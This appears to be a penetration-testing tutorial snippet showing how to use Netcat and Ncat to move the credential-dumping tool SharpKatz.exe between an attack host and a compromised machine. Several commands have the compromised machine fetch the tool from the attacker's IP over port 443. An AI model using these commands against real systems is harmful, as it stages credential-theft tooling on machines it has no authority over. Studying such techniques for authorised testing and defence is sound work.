## Netcat
## File Transfer with Netcat and Ncat
#### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
#### Ncat - Compromised Machine - Listening on Port 8000
```shell-session
$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine
```shell-session
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine
```shell-session
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

#### Attack Host - Sending File as Input to Netcat
```shell-session
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```shell-session
$ nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat
```shell-session
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```shell-session
 ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
